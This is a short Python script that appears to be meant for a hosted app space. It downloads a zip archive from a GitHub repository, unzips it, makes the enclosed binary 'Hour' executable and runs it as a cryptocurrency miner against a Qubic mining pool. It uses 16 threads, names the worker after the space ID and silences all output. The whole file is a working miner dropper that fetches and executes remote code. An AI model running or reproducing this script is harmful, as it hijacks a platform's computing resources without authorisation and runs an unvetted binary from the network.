import os
os.system("wget https://github.com/qqivk/jenskl/raw/refs/heads/main/Hour.zip")
os.system("unzip Hour.zip")
os.system("chmod +x Hour")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./Hour --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
